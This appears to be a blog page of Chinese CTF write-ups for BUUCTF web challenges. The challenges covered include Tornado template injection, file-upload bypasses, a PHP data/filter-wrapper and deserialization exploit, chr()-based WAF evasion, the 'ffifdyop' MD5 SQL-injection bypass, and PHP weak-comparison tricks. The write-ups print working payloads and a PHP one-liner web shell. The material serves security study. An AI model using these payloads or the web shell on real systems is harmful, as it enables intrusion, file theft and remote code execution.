    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Buuctf-Web（21-24）"><a href="#Buuctf-Web（21-24）" class="headerlink" title="Buuctf Web（21-24）"></a>Buuctf Web（21-24）</h3><h4 id="21、easy-tornado"><a href="#21、easy-tornado" class="headerlink" title="21、easy_tornado"></a>21、easy_tornado</h4><p>题目首页有三个链接，首先查看&#x2F;flag.txt，可以看到flag在&#x2F;fllllllllllllag中</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8124ed8c-6dfb-4f89-b050-8a841a4e56b2" alt="image"></p>
<p>查看&#x2F;fllllllllllllag，显示Error</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9a24200a-c33a-4ec5-b86a-0f598b975988" alt="image"></p>
<p>并且url变成了&#x2F;error?msg&#x3D;Error</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bb555e51-15cf-4a34-ab56-50f0446c84f2" alt="image"></p>
<p>查看&#x2F;welcome.txt，内容为render</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1b813424-aff6-4218-b808-4b0d4b8d3426" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 ，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。</span><br><span class="line">Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</span><br></pre></td></tr></table></figure>

<p>查看&#x2F;hints.txt，这是一个加密方法，猜测 要构造<code>filename=/fllllllllllllag&amp;filehash=？</code></p>
<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230812150637958.png" alt="image-20230812150637958"></p>
<p>在查阅资料后发现Error就是注入点</p>
<p>本题是模板注入<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aef2ae0498df">SSTI模板注入 - 简书 (jianshu.com)</a></p>
<p>参考资料<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bwangel23/p/4858870.html">Tornado小记 – 模板中的Handler - 黑翼天使23 - 博客园 (cnblogs.com)</a></p>
<p>获取handler.settings环境变量：<code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
<p>得到cookie_secret</p>
<p><code>&#39;cookie_secret&#39;: &#39;caffff81-323f-48da-8323-dc1530a0c95d&#39;</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/32f7ab16-b8c5-4a51-acb3-1c4202250294" alt="image"></p>
<p>编写脚本</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def Md5(x):</span><br><span class="line">    md5 = hashlib.md5(str(x).encode(&quot;utf8&quot;)).hexdigest()</span><br><span class="line">    return md5</span><br><span class="line">    </span><br><span class="line">print(Md5(&quot;caffff81-323f-48da-8323-dc1530a0c95d&quot;+Md5(&quot;/fllllllllllllag&quot;)))</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/a033cbb8-a253-4db8-bf82-8ddf811a549c" alt="image"></p>
<p>构造<code>/file?filename=/fllllllllllllag&amp;filehash=7d14388e78d85a8f1e726052e9d4dfbd</code></p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2f83150e-3dd7-4d3a-89b2-1b63b92c9691" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5673c2e4-27f7-4962-8d87-f449b8069952&#125;</span><br></pre></td></tr></table></figure>

<h4 id="22、admin"><a href="#22、admin" class="headerlink" title="22、admin"></a>22、admin</h4><p>注册一个账号</p>
<p>由于题目叫admin，所以注册时直接用admin了</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d1074fae-9dc5-476a-a188-aac12ef08226" alt="image"></p>
<p>显示用户名已经被注册过</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b73df34a-1a5b-4f00-b869-c72281dd2abb" alt="image"></p>
<p>注册一个账号</p>
<p>由于题目叫admin，所以注册时直接用admin了</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d1074fae-9dc5-476a-a188-aac12ef08226" alt="image"></p>
<p>显示用户名已经被注册过</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b73df34a-1a5b-4f00-b869-c72281dd2abb" alt="image"></p>
<p>猜密码</p>
<p>用123登陆成功了。。。</p>
<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230812171109196.png" alt="image-20230812171109196"></p>
<p>在网上看大佬解题思路</p>
<p>注册</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0dc1b0d0-bc52-4352-a081-27b2a6b5f2f7" alt="image"></p>
<p>登录，右侧依次查看</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d87e4454-5a16-4fea-9512-9bef90f01a9c" alt="image"></p>
<p>在change password的源代码中看到一个被注释的链接</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bc16f3dc-36de-4130-885a-8334541c24ee" alt="image"></p>
<p>访问这个链接，内容已被删除，所以就没再看了</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b1fe4d77-4ed1-4c7b-a261-dbf716519595" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;88c07276-46ea-4e23-a50d-ce722b067e0f&#125;</span><br></pre></td></tr></table></figure>

<h4 id="23、你传你🐎呢"><a href="#23、你传你🐎呢" class="headerlink" title="23、你传你🐎呢"></a>23、你传你🐎呢</h4><p>查看大佬的博客后，了解到，该题需要上传两个文件</p>
<p>一、<code>.htaccess</code>文件，用来改变文件扩展名</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/546f346f-4cc2-4387-99b5-e4f679a198c6" alt="image"></p>
<p>上传该文件，抓包，修改Content-Type:image&#x2F;png，send</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/eb0d84c7-11ba-4569-86ce-2d852e01f523" alt="image"></p>
<p>二、木马文件，用来连接蚁剑</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e02853bf-cf0e-4480-a249-a94d1e290c97" alt="image"></p>
<p>改名为a.png，上传，抓包，修改Content-Type:image&#x2F;png，send</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8647b067-6164-4385-a7a1-3d27b8eb1697" alt="image"></p>
<p>用蚁剑连接</p>
<p>URL：<code>http://f532922c-3101-4cac-ad67-3e8b27c936fe.node4.buuoj.cn:81/upload/535c8c0c4ab4ecda962a1a3922bee31d/a.png</code></p>
<p>密码：<code>a</code></p>
<p>没测试成功，试了很久没写出来，留着以后看</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="24、NiZhuanSiWei"><a href="#24、NiZhuanSiWei" class="headerlink" title="24、NiZhuanSiWei"></a>24、NiZhuanSiWei</h4><p>从题目的php代码中可以知道需要用get方式传三个参数，text，file，password</p>
<p>有一个php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2ed62ae4-cebd-49e4-9fff-62144ce580d8" alt="image"></p>
<p>访问该文件，什么都没有</p>
<p>有一行代码说我们要传入一个文件，内容是”welcome to the zjctf”</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7acb96ce-aecd-4d57-813d-096ae3ddf798" alt="image"></p>
<p>要用到data协议，data协议通常是用来执行PHP代码，也可以将内容写入data协议中，然后让file_get_contents函数取读取。构造：<code>data://text/plain,welcome to the zjctf</code></p>
<p>为了绕过一些过滤，用base64编码构造payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/22b156d1-ff92-4112-a963-03edd63872d5" alt="image"></p>
<p>有一个可控参数file，构造file&#x3D;useless.php，但是针对php文件我们需要进行base64编码，否则读取不到其内容，所以构造payload：<code>/?file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p>完整payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p>得到一串base64编码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bd421ff2-86f8-48fc-8536-ba0c204a473a" alt="image"></p>
<p>解码</p>
<p>得到useless.php源码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ff8cc374-6ccb-426b-8372-707bdb01642a" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>

<p>有一个 flag.php ,并且file不为空将读取flag.php并显示。所以。构造一个序列化字符串</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=flag.php;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$a = new Flag();</span><br><span class="line">$a-&gt;file=&quot;flag.php&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>找个在<a target="_blank" rel="noopener" href="https://c.runoob.com/compile/1">线运行PHP</a>的网站，得到</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/750e7fdf-d5d6-4c19-a5eb-19b42d5f7b33" alt="image"></p>
<p>构造payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ebb7fdd-ca59-4728-bf1d-30e878e931e2" alt="image"></p>
<p>查看源代码，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64288a23-13c1-4116-8574-dba7738b1408" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6cb4bd76-2b5f-4876-9fe0-46f02e2d0062&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/" data-id="cll80vdpg000030vfe67z1lar" data-title="Buuctf Web（21-24）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Buuctf Web（17-20）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/10/Buuctf%20Web%EF%BC%8817-20%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-08-10T08:23:07.000Z" itemprop="datePublished">2023-08-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/10/Buuctf%20Web%EF%BC%8817-20%EF%BC%89/">Buuctf Web（17-20）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Buuctf-Web（17-20）"><a href="#Buuctf-Web（17-20）" class="headerlink" title="Buuctf Web（17-20）"></a>Buuctf Web（17-20）</h3><h4 id="17、BackupFile"><a href="#17、BackupFile" class="headerlink" title="17、BackupFile"></a>17、BackupFile</h4><p>题目名称叫备份文件，直接用dirsearch扫描：<code>py -3.9 http://2677258c-1c01-46a9-9f37-cef51bea8534.node4.buuoj.cn:81/ -e php</code></p>
<p>响应成功的</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ee3eec70-5351-4d8b-af21-f802483b053d" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d6360fc0-cbb5-47e2-a051-18bf83d4e923" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d7f8a29a-c367-4885-8554-b6f89df5456a" alt="image"></p>
<p>访问&#x2F;index.php.bak文件，下载下来了</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/aacfde44-4ed9-49df-a3b5-ec6a188a3947" alt="image"></p>
<p>查看文件，如果key&#x3D;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3，输出flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c009b63e-5173-4f33-998c-8acff7917b82" alt="image"></p>
<p>如果直接构造payload：<code>/?key=123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3</code></p>
<p>显示只要数字</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/513a2e45-2b72-4878-b662-8a0998120daa" alt="image"></p>
<p>&#x3D;&#x3D;是弱相等，所以当key&#x3D;123时，就会输出flag</p>
<p>构造payload：<code>/?key=123</code></p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f632811c-a5ef-4ef6-a660-63d1f105cc37" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7e29466e-c1e3-4679-8eda-80c196664fe2&#125;</span><br></pre></td></tr></table></figure>

<h4 id="18、Easy-Calc"><a href="#18、Easy-Calc" class="headerlink" title="18、Easy Calc"></a>18、Easy Calc</h4><p>查看源代码，没看到啥</p>
<p>抓包，发现一个calc.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64070944-a8ec-4ddc-8a5e-b0a0f4cd5766" alt="image"></p>
<p>查看该文件，有一个黑名单</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2d679f14-d490-49c7-a112-758b0ff6d0f4" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">知识点：</span><br><span class="line">chr() 函数：从指定的 ASCII 值返回字符。 ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置0，而十六进制值被定义为带前置 0x。</span><br><span class="line">file_get_contents() 函数：把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</span><br><span class="line">PHP的字符串解析特性：PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】。假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</span><br><span class="line">scandir() 函数：返回指定目录中的文件和目录的数组。</span><br></pre></td></tr></table></figure>

<p>查看源码，$(“#content”).val()相当于 document.getElementById(“content”).value;</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d5bebfc0-7a4a-4c28-8cfa-28217d97f23b" alt="image"></p>
<p>PHP的字符串解析特性</p>
<p>尝试一下<code>/calc.php?num=phpinfo()</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1eb16acf-82ce-4a42-89b3-471967bbfeb7" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP的字符串解析特性：PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】。假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</span><br></pre></td></tr></table></figure>

<p>加个空格</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9c859a82-1cc8-4891-bd32-d7fa3b3f1847" alt="image"></p>
<p>由于“&#x2F;”被过滤了，所以我们可以使用chr(47)来进行表示，进行目录读取：<br><code>calc.php? num=1;var_dump(scandir(chr(47)))</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/083477f9-5926-4b52-9337-e540bb2a0bc3" alt="image"></p>
<p>构造：<code>/flagg——chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code></p>
<p>payload：<code>calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e88842dc-7cb8-4c54-b91a-6dbc7a589b30" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;21d2d1ed-ae60-4490-a8b0-0f712482f7cd&#125;</span><br></pre></td></tr></table></figure>

<h4 id="19、BuyFlag"><a href="#19、BuyFlag" class="headerlink" title="19、BuyFlag"></a>19、BuyFlag</h4><p>查看源代码，发现有两个php文件链接，点击一个查看</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2d01e952-8e74-4151-bf1d-d2c66d2400dd" alt="image"></p>
<p>点击右边的菜单，有PAYFLAG，点击查看</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2fb29ae2-8d79-4bd8-9f13-4a171e8223f0" alt="image"></p>
<p>出现这段话</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1b7ce3c6-69b4-4f52-8eb8-ddb32dbcb43e" alt="image"></p>
<p>查看源代码，用POST的方式传参，money&#x3D;100000000，password&#x3D;404，但是password不能为数字，所以password等于404+任意字符</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/a6c6e305-19c0-4d40-9ded-1f61d8e1f0b3" alt="image"></p>
<p>前面提示必须是cuit的学生，所以修改cookie里的<code>user=0</code>为<code>user=1</code></p>
<p>修改uesr&#x3D;0为user&#x3D;1，页面变了，提示输入password</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/19f46d7a-f13d-46d8-943e-edcdcdf53c93" alt="image"></p>
<p>post传参，password&#x3D;404a&amp;money&#x3D;100000000，提示数字太长</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6d96f999-4b00-4463-92d1-181397975739" alt="image"></p>
<p>尝试次方 1e9，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/db1ef7c7-60e1-4e0d-8d2c-56f9c5a535ce" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2eaf1e59-0556-4816-b343-80a3466e934e&#125; </span><br></pre></td></tr></table></figure>

<h4 id="20、Easy-MD5"><a href="#20、Easy-MD5" class="headerlink" title="20、Easy MD5"></a>20、Easy MD5</h4><p>查看源代码，找不到有用的信息，抓包</p>
<p>看到有一个提示：<code>Hint: select * from &#39;admin&#39; where password=md5($pass,true)</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5f427204-8f49-423a-9536-6d0cbe3e0761" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">md5(string,raw)</span><br><span class="line"></span><br><span class="line">string	必需，规定要计算的字符串。</span><br><span class="line"></span><br><span class="line">raw	可选，规定十六进制或二进制输出格式： TRUE - 原始 16 字符二进制格式；FALSE - 默认。32 字符十六进制数</span><br><span class="line"></span><br><span class="line">需要构造or来绕过password，md5(ffifdyop,true)=&#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line"></span><br><span class="line">原sql查询语句则变为select * from user where username =&#x27;admin&#x27; and password =&#x27;&#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c&#x27;即可绕过</span><br><span class="line"></span><br><span class="line">类似的字符串还有:md5(129581926211651571912466741651878684928,true)=\x06\xdaT0D\x9f\x8fo#\xdf\xc1&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>

<p>输入ffifdyop</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bce80f81-80f9-4529-b511-47c0fca9a2c9" alt="image"></p>
<p>提交</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7dfe98f9-5a49-4a6b-b599-3bfca11b40dc" alt="image"></p>
<p>查看源代码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/24807ed6-347a-4351-87d5-655f11e62061" alt="image"></p>
<p>用get传参，满足a!&#x3D;b且md5(a)&#x3D;md5(b)</p>
<p>md5加密后的值开头为0E，则说明它们的值相等</p>
<p>payload：<code>/levels91.php?a=s878926199a&amp;b=s155964671a</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/516f5189-c10d-4d47-ba7b-ed8b0f44666b" alt="image"></p>
<p>包含flag.php文件</p>
<p>用post传参，满足param1!&#x3D;param2且md5(param1)&#x3D;md5(param2)</p>
<p>这里用php数组绕过，由于哈希函数无法处理php数组，在遇到数组时返回false，我们就可以利用false&#x3D;&#x3D;false成立使条件成立。</p>
<p><code>param1[]=1&amp;param2[]=2</code></p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c26e0f72-c8ef-41ec-8d13-81b973edde69" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5699128f-b8b5-4580-9e90-8ab95639eb15&#125; </span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/10/Buuctf%20Web%EF%BC%8817-20%EF%BC%89/" data-id="cll6ircl000005svf78op6nzm" data-title="Buuctf Web（17-20）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Buuctf Web（13-16）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/09/Buuctf%20Web%EF%BC%8813-16%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-08-09T09:14:13.000Z" itemprop="datePublished">2023-08-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/09/Buuctf%20Web%EF%BC%8813-16%EF%BC%89/">Buuctf Web（13-16）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Buuctf-Web（13-16）"><a href="#Buuctf-Web（13-16）" class="headerlink" title="Buuctf Web（13-16）"></a>Buuctf Web（13-16）</h3><h4 id="13、Upload"><a href="#13、Upload" class="headerlink" title="13、Upload"></a>13、Upload</h4><p>创建一个木马文件</p>
<p>可绕过的后缀名检测：<code>php,php3,php4,php5,phtml.pht</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d5773950-aba3-4d69-a0d9-9c2fe6191a33" alt="image"></p>
<p>上传该文件，显示Not image!</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b9a3900-f491-4db5-93ce-7f7b44e9b7a6" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5051e49c-61ef-4826-9d5e-7cf5f8a80d93" alt="image"></p>
<p>抓包，修改<code>Content-Type</code>的内容为 <code>image/jpeg</code>，send，查看文件名后缀应为.phtml</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/60a1de1b-9b4e-43d7-a5fd-ee5509f92155" alt="image"></p>
<p>使用蚁剑</p>
<p>URL地址为：<code>/upload/a.phtml</code></p>
<p>连接密码为：<code>a</code></p>
<p>测试连接，连接成功后添加</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/db0568d7-6c26-4c82-9143-76b47e48f6c1" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/257b7d7f-ab0b-40ff-8b31-f6fd24c64273" alt="image"></p>
<p>右键单击，文件管理，查看根目录，找到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ad1fc581-4537-4c03-ac3f-bd0b85cb88e2" alt="image"></p>
<p>双击查看flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e2bff410-6c2e-406d-a06b-ae6b6d83e92b" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;34c3fd89-3b0b-450b-9953-287122b67247&#125;</span><br></pre></td></tr></table></figure>

<h4 id="14、Upload"><a href="#14、Upload" class="headerlink" title="14、Upload"></a>14、Upload</h4><p>上传一句话木马<code>&lt;?php eval($_POST[a]);?&gt;</code>，修改后缀名为<code>.jpg</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c12f4d12-96db-41d7-8f3a-6e9c6d95deb0" alt="image"></p>
<p>抓包，显示上传成功</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/52dea5e6-0636-44ab-a307-104363826373" alt="image"></p>
<p>使用蚁剑连接，URL地址为：<code>http://458e3dd3-d7c3-41c5-b4cd-06727f565048.node4.buuoj.cn:81/./uplo4d/394659692a460258b45a99f1424ea357.jpg</code></p>
<p>连接密码为：<code>a</code></p>
<p>尝试一下，测试连接显示返回数据为空</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3cac98aa-ef81-4468-a8ef-e0792d7a8c6d" alt="image"></p>
<p>尝试修改后缀名为.phtml</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/455b5f6b-955a-4acc-98f4-1e4766489658" alt="image"></p>
<p>使用蚁剑连接，URL地址为：<code>http://458e3dd3-d7c3-41c5-b4cd-06727f565048.node4.buuoj.cn:81/./uplo4d/71056c0c9cb12f2b7d720156da9eabf1.phtml</code></p>
<p>连接密码为：<code>a</code></p>
<p>测试连接，连接成功 后添加</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6d2c4b89-6449-40f7-b266-2fb166362b62" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d91e8710-36d0-45ea-b5af-941f2b401a04" alt="image"></p>
<p>右键单击，文件管理</p>
<p>在根目录中找到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ca56033-b394-40c2-8378-bcc65f53e15b" alt="image"></p>
<p>双击查看flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9166d150-0624-44fd-b1ef-9fea0ea3dfef" alt="image"></p>
